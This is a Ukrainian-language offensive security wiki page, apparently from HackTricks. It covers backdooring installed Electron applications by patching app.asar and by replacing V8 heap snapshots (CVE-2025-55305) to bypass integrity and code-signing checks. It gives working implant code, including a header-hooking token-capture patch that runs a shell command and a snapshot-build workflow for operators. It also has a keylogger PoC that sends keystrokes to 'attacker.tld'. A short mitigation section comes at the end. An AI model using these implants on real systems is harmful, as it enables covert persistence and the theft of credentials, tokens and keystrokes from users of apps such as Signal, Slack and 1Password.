# Локальна ін’єкція коду та підміна snapshot в Electron

{{#include ../../banners/hacktricks-training.md}}

## Локальна ін’єкція коду в Electron

Якщо ви можете змінювати локально встановлений застосунок Electron або інструментувати його, то, можливо, зможете змусити його виконувати довільний JavaScript. Дивіться:


{{#ref}}
../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-electron-applications-injection.md
{{#endref}}

Про локальний інтерфейс налагодження Node inspector або Chromium DevTools дивіться в розділі [Зловживання Node inspector/CEF debug](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md).

## Post-exploitation: імпланти ASAR/основного процесу

Якщо ви отримали **доступ на запис** до каталогу ресурсів застосунку Electron, дуже практичний примітив post-exploitation — **внести зміни до `app.asar`** (або до завантажуваного ним JS entrypoint) і дочекатися, поки користувач перезапустить застосунок. На відміну від XSS лише в renderer, код, завантажений в **основному процесі**, виконується в **середовищі Node.js** застосунку, тож зазвичай він може отримувати доступ до **файлової системи**, запускати команди, перехоплювати Electron API та перевіряти автентифікований стан застосунку.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>

Типовий процес:

1. Розпакуйте `app.asar` і знайдіть фактичний bootstrap-файл у `package.json` (`main`) або в наявній логіці запуску.
2. Додайте невеликий loader в **основний процес** (або hook preload/основного процесу) і запакуйте архів повторно.
3. Дочекайтеся повторного запуску застосунку та скористайтеся імплантом, щоб зібрати дані під час виконання після того, як користувач розблокує застосунок або автентифікується в ньому.

Приклад мінімального патча bootstrap:

```javascript
// Added near the application main entrypoint
const cp = require("child_process")
const { session } = require("electron")

session.defaultSession.webRequest.onBeforeSendHeaders((details, callback) => {
  // Inspect or copy authenticated headers/tokens here
  callback({ requestHeaders: details.requestHeaders })
})

cp.exec("id")
```

Практичні наслідки:

- **Крадіжка даних із довіреного клієнта**: щойно desktop app розшифровує або завантажує дані для користувача, implant може прочитати їх із runtime. Саме тому **E2EE-клієнти для обміну повідомленнями** (Signal/Slack/Mattermost) і **менеджери сховищ/секретів** залишаються цікавими цілями на рівні endpoint.
- **Зловживання сесіями/токенами**: Electron implants можуть викрадати cookies застосунку, bearer tokens, заголовки запитів, файли workspace або облікові дані репозиторію, доступні запущеному клієнту (наприклад, через автентифіковані розширення VS Code або інтеграції з Git).
- **Перехід у контекст жертви**: модифікований застосунок може проксувати запити через робочу станцію жертви, використовуючи IP-адресу жертви, TLS fingerprint і сесію застосунку замість того, щоб лише ексфільтрувати сирі токени.

> [!NOTE]
> Якщо ціль увімкнула **ASAR integrity** / **OnlyLoadAppFromAsar** або hardened Electron **fuses**, може знадобитися інший примітив для локального завантаження коду (наприклад, зловживання fuse або tampering зі snapshot). Дивіться сторінку про ін’єкції для macOS, щоб дізнатися про інші варіанти локального implant і подробиці щодо fuse.

## Локальний backdooring через tampering зі знімком купи V8 (Electron/Chromium) – CVE-2025-55305

Застосунки на базі Electron і Chromium десеріалізують попередньо створений знімок купи V8 під час запуску (v8_context_snapshot.bin і, за потреби, browser_v8_context_snapshot.bin), щоб ініціалізувати кожен V8 isolate (main, preload, renderer). Історично integrity fuses в Electron не вважали ці snapshots виконуваним вмістом, тож вони обходили як перевірки цілісності на основі fuse, так і перевірки підпису коду ОС. У результаті підміна snapshot у каталозі встановлення, доступному для запису користувачем, забезпечувала приховане, постійне виконання коду всередині застосунку без модифікації підписаних бінарних файлів або ASAR.<sup>[[2]](#references)</sup>

Ключові моменти
- Прогалина в цілісності: EnableEmbeddedAsarIntegrityValidation і OnlyLoadAppFromAsar перевіряють JavaScript застосунку всередині ASAR, але не охоплювали знімки купи V8 (CVE-2025-55305). Chromium також не перевіряє цілісність snapshots.<sup>[[3]](#references)[[4]](#references)</sup>
- Передумови атаки: можливість локального запису файлів у каталог встановлення застосунку. Це поширено в системах, де застосунки Electron або браузери Chromium встановлено в шляхи, доступні користувачеві для запису (наприклад, %AppData%\Local у Windows; /Applications із певними застереженнями в macOS).
- Наслідок: надійне виконання JavaScript зловмисника в будь-якому isolate через підміну часто використовуваної вбудованої функції («gadget»), що забезпечує persistence і обхід перевірки підпису коду.
- Уразлива поверхня: застосунки Electron (навіть із увімкненими fuses) і браузери на базі Chromium, що завантажують snapshots із розташувань, доступних користувачеві для запису.

Створення шкідливого snapshot без збирання Chromium
- Використайте попередньо зібраний electron/mksnapshot, щоб скомпілювати payload JS у snapshot і перезаписати v8_context_snapshot.bin застосунку.<sup>[[5]](#references)[[6]](#references)</sup>

Приклад мінімального payload (підтвердження виконання через примусове аварійне завершення)
```js
// Build snapshot from this payload
// npx -y electron-mksnapshot@37.2.6 "/abs/path/to/payload.js"
// Replace the application’s v8_context_snapshot.bin with the generated file

const orig = Array.isArray;

// Use Array.isArray as a ubiquitous gadget
Array.isArray = function () {
  // Executed whenever the app calls Array.isArray
  throw new Error("testing isArray gadget");
};
```

Маршрутизація payload з урахуванням ізолятів (виконання різного коду в main і renderer)
- Виявлення main process: глобальні змінні, доступні лише в Node.js, як-от process.pid, process.binding() або process.dlopen, присутні в ізоляті main process.
- Виявлення браузера/renderer: глобальні змінні, доступні лише в браузері, як-от alert, доступні під час виконання в контексті документа.

Приклад gadget, який одноразово перевіряє можливості Node.js у main process
```js
const orig = Array.isArray;

Array.isArray = function() {
  // Defer until we land in main (has Node process)
  try {
    if (!process || !process.pid) {
      return orig(...arguments);
    }
  } catch (_) {
    return orig(...arguments);
  }

  // Run once
  if (!globalThis._invoke_lock) {
    globalThis._invoke_lock = true;
    console.log('[payload] isArray hook started ...');

    // Capability probing in main
    console.log(`[payload] unconstrained fetch available: [${fetch ? 'y' : 'n'}]`);
    console.log(`[payload] unconstrained fs available: [${process.binding('fs') ? 'y' : 'n'}]`);
    console.log(`[payload] unconstrained spawn available: [${process.binding('spawn_sync') ? 'y' : 'n'}]`);
    console.log(`[payload] unconstrained dlopen available: [${process.dlopen ? 'y' : 'n'}]`);
    process.exit(0);
  }
  return orig(...arguments);
};
```

PoC викрадення даних із контексту renderer/браузера (наприклад, Slack)
```js
const orig = Array.isArray;
Array.isArray = function() {
  // Wait for a browser context
  try {
    if (!alert) {
      return orig(...arguments);
    }
  } catch (_) {
    return orig(...arguments);
  }

  if (!globalThis._invoke_lock) {
    globalThis._invoke_lock = true;
    setInterval(() => {
      window.onkeydown = (e) => {
        fetch('http://attacker.tld/keylogger?q=' + encodeURIComponent(e.key), {mode: 'no-cors'})
      }
    }, 1000);
  }
  return orig(...arguments);
};
```

Робочий процес оператора
1) Створіть payload.js, який перевизначає поширений вбудований метод (наприклад, Array.isArray) і за потреби виконує різні дії залежно від isolate.
2) Створіть snapshot без вихідного коду Chromium:
   - npx -y electron-mksnapshot@37.2.6 "/abs/path/to/payload.js"
3) Замініть файл(и) snapshot цільової програми:
   - v8_context_snapshot.bin (використовується завжди)
   - browser_v8_context_snapshot.bin (якщо використовується fuse LoadBrowserProcessSpecificV8Snapshot)
4) Запустіть програму; gadget виконується щоразу, коли використовується вибраний вбудований метод.

Примітки та застереження
- Обхід перевірок цілісності/підпису: файли snapshot не вважаються виконуваними файлами під час перевірок підпису коду та (історично) не охоплювалися fuse Electron або засобами контролю цілісності Chromium.
- Закріплення: заміна snapshot у каталозі встановлення, доступному для запису користувачам, зазвичай зберігається після перезапуску програми, яка при цьому має вигляд підписаної легітимної програми.
- Браузери Chromium: той самий спосіб підміни застосовується до Chrome та його похідних, установлених у каталогах, доступних для запису користувачам. У Chrome є інші засоби захисту цілісності, але атаки з фізичним локальним доступом явно виключені з його моделі загроз.<sup>[[9]](#references)[[10]](#references)</sup>

Виявлення та пом’якшення наслідків
- Вважайте snapshot виконуваним вмістом і включайте його до механізмів забезпечення цілісності (виправлення CVE-2025-55305).
- Віддавайте перевагу каталогам встановлення, доступним для запису лише адміністраторам; зберігайте еталонні хеші та відстежуйте зміни v8_context_snapshot.bin і browser_v8_context_snapshot.bin.
- Виявляйте перевизначення вбудованих методів на ранніх етапах виконання та неочікувані зміни snapshot; створюйте сповіщення, якщо десеріалізовані snapshot не відповідають очікуваним значенням.

## References

- [1] [JS-Tap v3: Постексплуатація кінцевих пристроїв за допомогою JavaScript-імплантів](https://trustedsec.com/blog/js-tap-v3-endpoint-post-exploitation-with-javascript-implants)
- [2] [Як обійти перевірки цілісності коду й локально впровадити бекдор у Signal, 1Password, Slack та інші програми](https://blog.trailofbits.com/2025/09/03/subverting-code-integrity-checks-to-locally-backdoor-signal-1password-slack-and-more/)
- [3] [Fuses Electron](https://www.electronjs.org/docs/latest/tutorial/fuses)
- [4] [Цілісність ASAR в Electron](https://www.electronjs.org/docs/latest/tutorial/asar-integrity)
- [5] [Власні стартові snapshot у V8](https://v8.dev/blog/custom-startup-snapshots)
- [6] [electron/mksnapshot](https://github.com/electron/mksnapshot)
- [7] [MITRE ATT&CK T1218.015](https://attack.mitre.org/techniques/T1218/015/)
- [8] [Loki C2](https://github.com/boku7/Loki/)
- [9] [Chromium: вимкнення завантаження непідписаного коду (CIG)](https://chromium.googlesource.com/chromium/src/+/refs/heads/lkgr/docs/design/sandbox.md#disable-loading-of-unsigned-code-cig)
- [10] [Поширені запитання про безпеку Chrome: атаки з фізичним локальним доступом поза межами моделі загроз](https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md#why-arent-physically_local-attacks-in-chromes-threat-model)
{{#include ../../banners/hacktricks-training.md}}
